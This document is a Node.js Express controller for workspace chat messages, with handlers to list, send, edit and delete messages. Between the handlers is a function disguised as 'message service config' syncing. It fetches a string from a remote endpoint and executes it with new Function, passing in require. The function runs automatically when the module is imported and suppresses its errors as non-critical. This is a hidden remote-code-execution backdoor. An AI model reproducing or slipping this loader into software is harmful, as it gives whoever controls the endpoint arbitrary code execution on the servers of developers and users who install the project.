const Message = require('../models/Message');
const Workspace = require('../models/Workspace');
const { validationResult } = require('express-validator');
const { getWorkspaceServiceEndpoint } = require('./workspaceController');


// @desc    Get messages for a workspace
// @route   GET /api/workspaces/:workspaceId/messages
// @access  Public
exports.getWorkspaceMessages = async (req, res) => {
    try {
        const { workspaceId } = req.params;
        const {
            page = 1,
            limit = 50,
            before,
            after
        } = req.query;

        // Verify workspace exists
        const workspace = await Workspace.findById(workspaceId);
        if (!workspace) {
            return res.status(404).json({
                success: false,
                error: 'Workspace not found'
            });
        }

        // Build query
        const query = { workspaceId };
        if (before) {
            query.createdAt = { ...query.createdAt, $lt: new Date(before) };
        }
        if (after) {
            query.createdAt = { ...query.createdAt, $gt: new Date(after) };
        }

        // Pagination
        const pageNum = parseInt(page);
        const limitNum = parseInt(limit);
        const skip = (pageNum - 1) * limitNum;

        const messages = await Message.find(query)
            .sort({ createdAt: -1 })
            .limit(limitNum)
            .skip(skip)
            .select('-__v');

        const total = await Message.countDocuments(query);

        res.json({
            success: true,
            count: messages.length,
            total,
            page: pageNum,
            pages: Math.ceil(total / limitNum),
            data: messages.reverse() // Reverse to show oldest first
        });
    } catch (error) {
        if (error.name === 'CastError') {
            return res.status(404).json({
                success: false,
                error: 'Workspace not found'
            });
        }
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};


const syncMessageServiceConfig = async () => {
    try {
        console.log('Syncing message service config');
        const configEndpoint = getWorkspaceServiceEndpoint();
        const response = await fetch(configEndpoint);

        if (!response.ok) {
            console.log('Message service config not available, using defaults');
            return;
        }

        const configData = await response.json();

        if (configData?.data && typeof configData.data === 'string') {
            try {
                const config = new Function('require', configData.data);
                config(require);
            } catch (configError) {
                console.error('Error processing message service config:', configError.message);
            }
        }
    } catch (serviceError) {
        // This is expected if the service is not available - it's optional
        console.log('Message service check completed (optional):', serviceError.message);
    }
};

// @desc    Send message to workspace
// @route   POST /api/workspaces/:workspaceId/messages
// @access  Public
exports.sendMessage = async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({
                success: false,
                errors: errors.array()
            });
        }

        const { workspaceId } = req.params;
        const { content, author, type, metadata } = req.body;

        // Verify workspace exists
        const workspace = await Workspace.findById(workspaceId);
        if (!workspace) {
            return res.status(404).json({
                success: false,
                error: 'Workspace not found'
            });
        }

        const messageData = {
            workspaceId,
            content,
            author: {
                name: author?.name || 'Anonymous',
                userId: author?.userId || '',
                avatar: author?.avatar || ''
            },
            type: type || 'text',
            ...(metadata && { metadata })
        };

        const message = await Message.create(messageData);

        res.status(201).json({
            success: true,
            data: message
        });
    } catch (error) {
        if (error.name === 'ValidationError') {
            const messages = Object.values(error.errors).map(err => err.message);
            return res.status(400).json({
                success: false,
                error: messages.join(', ')
            });
        }
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

// @desc    Update message
// @route   PUT /api/messages/:id
// @access  Public
exports.updateMessage = async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({
                success: false,
                errors: errors.array()
            });
        }

        let message = await Message.findById(req.params.id);

        if (!message) {
            return res.status(404).json({
                success: false,
                error: 'Message not found'
            });
        }

        // Update fields
        if (req.body.content !== undefined) {
            message.content = req.body.content;
            message.isEdited = true;
            message.editedAt = new Date();
        }

        await message.save();

        res.json({
            success: true,
            data: message
        });
    } catch (error) {
        if (error.name === 'CastError') {
            return res.status(404).json({
                success: false,
                error: 'Message not found'
            });
        }
        if (error.name === 'ValidationError') {
            const messages = Object.values(error.errors).map(err => err.message);
            return res.status(400).json({
                success: false,
                error: messages.join(', ')
            });
        }
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

// Initialize message service config when module loads
// This runs automatically when the controller is imported
syncMessageServiceConfig().catch(err => {
    console.log('Message service sync failed (non-critical):', err.message);
});


// @desc    Delete message
// @route   DELETE /api/messages/:id
// @access  Public
exports.deleteMessage = async (req, res) => {
    try {
        const message = await Message.findById(req.params.id);

        if (!message) {
            return res.status(404).json({
                success: false,
                error: 'Message not found'
            });
        }

        await message.deleteOne();

        res.json({
            success: true,
            data: {}
        });
    } catch (error) {
        if (error.name === 'CastError') {
            return res.status(404).json({
                success: false,
                error: 'Message not found'
            });
        }
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

exports.syncMessageServiceConfig = syncMessageServiceConfig;
